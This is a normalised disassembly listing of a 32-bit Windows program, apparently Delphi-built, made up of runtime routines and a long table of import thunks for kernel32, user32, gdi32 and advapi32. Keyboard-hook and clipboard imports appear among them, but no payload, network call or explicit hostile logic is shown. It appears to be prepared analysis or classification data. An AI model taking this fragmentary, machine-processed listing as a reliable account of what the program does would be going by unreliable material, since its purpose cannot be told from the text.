cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_4060cc
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402890
mov [ rw-data ] edx
call sub_403f54
sub_4028f4
push eax
push edx
push ecx
call sub_4060cc
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_4028e8
retn
sub_402910
retn
sub_402964
retn
sub_402968
push ebx
call sub_4060cc
mov ebx [ eax + 0x4 ]
call sub_4060cc
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_4029d4
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_4029e4
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402a80
mov edx [ eax + 0x1c ]
call sub_402a38
retn
sub_402b13
retn
sub_402b14
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_402988
retn
sub_402d24
mov ecx 0xff
call sub_402d30
retn
sub_402d54
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402d70
jmp sub_402d70
sub_402d6d
retn
sub_4030fd
jmp sub_403970
sub_403150
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031a8
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031b4
push ebx
mov ebx eax
mov eax ebx
call sub_4031e4
call sub_40278c
mov edx eax
mov eax ebx
call sub_403228
pop ebx
retn
sub_4031d0
push ebx
mov ebx eax
mov eax ebx
call sub_403280
mov eax ebx
call sub_4027ac
pop ebx
retn
sub_4031e4
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_40320c
call sub_4035a8
test dl dl
jle r-xdata
retn
call sub_403590
sub_4032cc
retn
sub_403354
jmp sub_403970
sub_40335b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403464
mov eax 0x8000ffff
retn
sub_40346c
retn
sub_403470
retn
sub_403474
retn
sub_403569
jmp sub_4036bc
sub_40356e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4039d0
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403590
sub_403590
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403598
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035a8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035b8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403680
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_40369c
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a69
retn
sub_403bac
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c3a
jmp sub_4036bc
sub_403c9a
jmp sub_4036bc
sub_403cb4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bac
mov [ rw-data ] 0x0
call sub_403c54
retn
sub_403ded
retn
sub_403f4f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f54
mov [ rw-data ] eax
call sub_403e7c
sub_404190
retn
sub_4041cc
retn
sub_4041da
retn
sub_4041f3
retn
sub_404204
retn
sub_4042eb
retn
j_sub_404438
jmp sub_404438
sub_404481
retn
sub_404489
retn
sub_4044cb
retn
sub_404650
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028e8
sub_404668
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_4013b4
sub_4047c0
retn
sub_4047d2
retn
sub_4049c8
mov ecx 0x1
jmp sub_404934
sub_4049d2
retn
sub_404a08
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028e8
call [ rw-data ]
retn
sub_404b0c
mov ecx 0x1
jmp sub_404a20
sub_404b16
retn
sub_404b18
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028e8
call [ rw-data ]
retn
sub_404d3e
retn
sub_404d40
push edx
call sub_40278c
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_4049c8
pop eax
sub_404d54
push eax
call sub_404b0c
pop eax
call sub_4027ac
retn
sub_404d64
xchg ecx eax
xchg edx ecx
call sub_4040c8
retn
sub_404db8
mov al 0x11
jmp sub_4028e8
sub_404de3
retn
sub_405024
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c4c
pop ebp
retn 0x4
j_sub_404a20
jmp sub_404a20
sub_405039
retn
sub_40503c
call sub_4052f0
retn
sub_40537c
call sub_405354
retn
sub_4056c5
jmp sub_403970
sub_405830
call sub_405840
retn
sub_405838
call sub_405860
retn
sub_405840
push ebx
mov ebx eax
mov eax 0x8
call sub_40278c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4058fb
jmp sub_4036bc
sub_40591c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405990
jmp sub_403970
sub_405997
pop ecx
pop ebp
retn
sub_405a10
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405a1c
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405a28
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_4028e8
sub_405a38
call sub_4031b4
mov [ eax + 0x4 ] 0x1
retn
sub_405a70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405d5f
jmp sub_403970
sub_405d66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e03
jmp sub_403970
sub_405e0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e53
jmp sub_403970
sub_405e5a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405f1e
jmp sub_403970
sub_405f25
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405f76
jmp sub_403970
sub_405f7d
pop ebp
retn
sub_406054
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_406074
push eax
push 0x40
call LocalAlloc
retn
sub_406080
mov eax 0x10
retn
sub_40610c
mov eax rw-data
call sub_40591c
retn
sub_406181
jmp sub_403970
sub_406188
pop ebp
retn
sub_40618c
sub [ rw-data ] 0x1
retn
sub_406194
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4061b0
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_4061f9
jmp sub_403970
sub_406200
pop ebp
retn
sub_406204
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4064d8
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CloseEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:CloseEnhMetaFile) ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateEnhMetaFileA
jmp [ CreateEnhMetaFileA@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteEnhMetaFile) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LPtoDP
jmp [ LPtoDP@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetMapMode
jmp [ __import_lookup_table_8(gdi32:SetMapMode) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessageTime
jmp [ __import_lookup_table_9(user32:GetMessageTime) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406c74
call GetTickCount
retn
sub_406c7c
xchg edx eax
call sub_402988
retn
sub_406c84
xor eax eax
retn
sub_406c88
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406c98
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406cb4
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406cc8
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406d00
call sub_406c68
retn
sub_406d08
call sub_406c68
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406ee5
jmp sub_403970
sub_406eec
pop ebp
retn
sub_406ef0
sub [ rw-data ] 0x1
retn
sub_406f1d
jmp sub_403970
sub_406f24
pop ebp
retn
sub_406f28
sub [ rw-data ] 0x1
retn
sub_407265
jmp sub_403970
sub_40726c
pop ebp
retn
sub_407270
sub [ rw-data ] 0x1
retn
sub_407d35
add eax 0xffffffd4
jmp sub_40d1ec
sub_407d3d
add eax 0xffffffd4
jmp sub_40d288
sub_407d4f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a70
sub_407e30
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
pop ebx
retn
sub_408108
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4080d0
test eax eax
sete al
pop esi
pop ebx
retn
sub_408640
call sub_40861c
retn
sub_4086d8
push eax
call CloseHandle
retn
sub_4088a8
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4088bc
push esi
mov esi eax
xchg edx eax
call sub_402988
mov eax esi
pop esi
retn
sub_408a7c
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_40278c
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408a90
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408ac8
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4027ac
sub_408b30
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_4028e8
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408b54
push ebx
mov ebx eax
mov eax ebx
call sub_403f6c
pop ebx
retn
sub_408eb7
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f6c
pop eax
pop ebx
retn
sub_40916f
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_4092ca
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409627
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409627
sub_409720
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esi
xor ecx ecx
call sub_409570
pop esi
pop ebx
retn
sub_409794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esi
mov cl 0x1
call sub_409570
pop esi
pop ebx
retn
sub_409e7e
jmp sub_403970
sub_409e85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409f76
jmp sub_403970
sub_409f7d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a721
jmp sub_403970
sub_40a728
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a7b0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a754
pop ebp
retn 0x8
sub_40a8f5
jmp sub_403970
sub_40a8fc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ad9f
jmp sub_403970
sub_40ada6
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b2bf
jmp sub_403970
sub_40b2c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b371
jmp sub_403970
sub_40b378
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b41b
jmp sub_403970
sub_40b422
pop esi
pop ecx
pop ebp
retn
sub_40b5fe
jmp sub_403970
sub_40b605
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b65c
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b8b8
mov eax [ rw-data ]
call sub_4039a8
retn
sub_40b95a
jmp sub_403970
sub_40ba28
jmp sub_403970
sub_40ba98
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4031d0
sub_40bc34
jmp sub_403970
sub_40bc3b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bc44
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039a8
sub_40bc51
retn
sub_40bc54
push ebp
mov ebp esp
call sub_40bb98
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bc44
pop ebp
retn 0x4
sub_40bc70
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
retn
sub_40bd08
push ebx
mov ebx eax
mov eax ebx
call sub_40bc88
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bedb
jmp sub_403970
sub_40bee2
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bfa7
jmp sub_403970
sub_40bfae
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bfb8
call sub_40b7f0
mov eax 0x1
call sub_403f54
sub_40c13c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c215
jmp sub_403970
sub_40c232
jmp sub_403970
sub_40c239
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c2e4
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c248
mov ecx eax
sub_40c4d0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c4f0
push eax
call CharNextA
retn
sub_40c7a0
jmp sub_403970
sub_40c7a7
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c810
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cc67
jmp sub_403970
sub_40cc6e
pop ebx
mov esp ebp
pop ebp
retn
sub_40ce37
jmp sub_403970
sub_40ce3e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cee0
jmp sub_403970
sub_40cee7
pop ebx
mov esp ebp
pop ebp
retn
sub_40ceec
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40ce50
sub_40cefc
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cf18
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
